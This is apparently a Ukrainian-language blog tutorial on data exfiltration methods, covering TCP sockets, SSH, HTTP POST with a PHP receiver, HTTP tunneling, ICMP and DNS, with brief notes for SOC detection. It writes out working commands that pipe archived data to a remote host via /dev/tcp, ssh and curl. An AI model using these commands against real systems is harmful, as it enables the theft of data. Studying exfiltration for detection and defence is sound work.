---
title: Exfiltration
date: 2024-06-19 12:00:00 -500
categories: [basics]
tags: [cyber, exfiltration]
image:
  path: /assets/img/articles/exfiltration-main.jpeg
  alt: puppet main
---

Ультимативною метою кожного хто атакує вашу мережу є **дані**. 

Як тільки хакер опиняється і закріплюється у системі він приступає до пошуку сервера файлів чи бази даних. Втім, крім отримання доступу до даних треба ще їх безпечно передати собі.


Якщо підходити до цього процесу бездумно - можна доволі легко попасти під увагу систем виявлення. Погодьтесь доволі незвично коли з email сервера раптом починає йти HTTPS трафік - люди не використовують email сервер щоб серфити інтернет.
Тим не менш, якщо трафік сервера не логується - служба безпеки ніколи не дізнається що із сервером щось не так. Тому варто знати та розуміти можливі слабкі місця системи 

Досвідчений хакер буде намагатись приховати дані що йдуть з сервера, щоб він виглядав як звичайний щоденний трафік. Наприклад спочатку передати дані із email сервера на робочу станцію де HTTPS трафік не буде чимось незвичним, далі злити до себе на віддалений сервер.

Крім типу трафіку звісно ще має значення його обʼєм, кілька мегабайт бази даних легко загубляться у мережі, втім кілька терабайт нового серіалу (як було при зламі Sony Pictures) то вже інша справа. Тож на ці метрики також варто звертати уваги у вашому SOC.

Розглянемо кілька цікавих методик отримання даних із мережі. Десь я буду просто згадувати що такий протокол є, десь трохи глибше його розглядати якщо механізм не стандартний.

Є три типових сценарія із якими стикається нападник:
1. Традиційна ексфільтрація даних - в даному випадку робиться один чи кілька мережевих запитів (залежить від розміру даних). Дані йдуть із мережі назовні, і запити не потребують відповіді.

2. Command and Control (C2) - фреймворки які дозволяють встановити звʼязок із компом жертви через (не)стандартні протоколи. Дозволяють як надсилати, так і отримувати відповіді на запити. Це як звичайна reverse shell, але більш просунуте і з дефолтними протоколами (HTTPS, DNS) 

3. Tunneling - хакер користується техніками ексфільтраціх щоб встановити звʼязок між компами. Канал виступає мостом який дозволяє хакеру отримати доступ до всієї мережі (прокся). Трафік гуляє по мосту весь час.

# Приклади використання
1) **TCP socket** - метод що використовується у не дуже захищенних мережах. Його доволі легко виявити так як використовується не стадартні протоколи. Також нам треба додатково шифрувати дані що передаються. Тут можно побачити приклад такої передачі даних

```bash
# відкриваємо порт і перенаправляємо у файл те що на нього прилетить
l33t@attacker$ nc -lvp 8080 > /tmp/data-creds.data

# відправляємо дані з пк жертви перед тим запакував теку target, ip адреса для прикладу
user@victim:$ tar zcf - data/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080 

# розшифровуємо та розпаковуємо дані в себе
l33t@attacker:/tmp/$ dd conv=ascii if=data-creds.data |base64 -d > data-creds.tar
```

2) **SSH** - гарний метод, шифрований канал. Як варіант це звісно SCP, але уявимо що його немає. Тоді є також варіант передачи кліентом. Тут можна побачити техніку виконання

```bash
   user@victim:$ tar cf - data/ | ssh l33t@attacker "cd /tmp/; tar xpf -"
```
3) **HTTP(S)** - також гарний варіант якщо такий тип трафіка притаманний хосту. Звісно краще користуватись шифрованою версію протоколу. Звичайний HTTP трафік від зловмісного доволі важко відрізники, втім для надійності треба використовувати POST запит. 
Всі параметри GET запита потрапляють у лог файл, тож це залишає по собі слід. 
Інші переваги POST:
1. Запити не кешуються
2. Запити не залишаються у історії браузера
3. Вони не обмежені за розміром (теоретично, втім ліміт може бути десь 2ГБ)

Як курлом користуватись ви знаєте, тож простий приклад.

```php
# web server kinda
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```
```bash
# exfiltration:
curl --data "file=$(tar zcf - task6 | base64)" http://server/contact.php
# correct broken base64
sudo sed -i 's/ /+/g' /tmp/http.bs64
```
**HTTP Tunneling** - зазвичай у мережі є кілька хостів що не мають доступу до Інтернету, наприклад сервер БД, зазвичай йому треба доступ лише до бекенду.
Втім ви можете перетворити один із внутрішніх хостів на проксі і через HTTP та мати змогу досліджувати хости зі своєї машини.
Для цього можно використовувати **Neo-reGeorg**.

 Тула генерує сервер-кліент під відомі веб сервери, далі ви підключаєтесь до хоста як socks5. 

![Socks5](/assets/img/articles/exfiltration-socks5.jpeg)
__Tunneling Example__

4) **ICMP** - цей метод цікавий тим що ICMP не є транспортним протоколом. Тому не дуже очевидний під час аналізу трафіку. Плюс доволі часто він дозволений та включений у мережі. Хоча на сучасних Windows системах і заблочений за замовчуванням.

Якщо ми подивимось у спеціфікацію протоколу, або навіть просто на пакет у Wireshark, то помітимо там 16 hex байтів секції Data. Зазвичай вона заповнена рандомними даними.
![ICMP](/assets/img/articles/exfiltration-icmp-spec.jpeg)
__ICMP Spec__

Втім на linux системах у ping є ключ -p завдяки якому ми можемо розмістити там свої дані. Згідно мануалу ця функція корисна щоб діагностувати проблеми із даними в мережі. Виглядає це так:
![Ping](/assets/img/articles/exfiltration-ping-example1.jpeg)
__Ping example__
![Ping](/assets/img/articles/exfiltration-ping-example2.jpeg)
__Ping example__

Звісно це лише приклад щоб пояснити механізм. Для передачі файлів він не підходе, як мінімум тому що для цього треба розділяти файл на частини та надсилати. Щоб зробити це автоматично у **Metasploit є модуль - auxiliary/server/icmp_exfil**

5) Останній варіант що ми розглянемо сьогодні - **DNS**.
Техніка яка доволі часто використовується у Bug Bounty, з допомогою неї доволі просто перевірити чи щось "відстукує" з атакуємого сервера до вас внаслідок ваших маніпуляцій із ним.

Отже як це працює:
1. Хакер заводить собі домен над яким має повний контроль (або користується сервісами типу [webhook](https://webhook.site)
2. Кодує данні що треба надіслати
3. Використовує ці дані як сабдомен (обмеження в 255 сиволів на весь урл)
4. Робить запит за допомогою dig (використовується для опитування DNS-серверів і отримання записів про домен, що запитується)
5. Дані прилітають у вигляді dns запиту на сервер зловмисника

Такий принцип роботи механізму вручну, власне ми можемо направляти інформацію і в іншу сторону, якщо додамо ії в TXT запис домену. На цьому побудована робота деяких C2 тулів що працюють через DNS.

Втім існують також варіанти створення туннеля через так звані TCP over DNS. Наприклад можете почитати про iodine, дуже цікава історія. Хакінг як він є.

Я розглянув деякі приклади для того щоб дати вам зрозуміти наскільки можливо користуватись інструментами щоб здавалось б не створені для цього. Достатньо мислити ширше, власне в цьому і є все цікаве.

Я не чіпав методи по типу ексфільтрації даних через звукові хвилі які людина не чує, хоча вони і актуальні у ізольованих середовищах. 
Втім існує і таке) Успіхів.
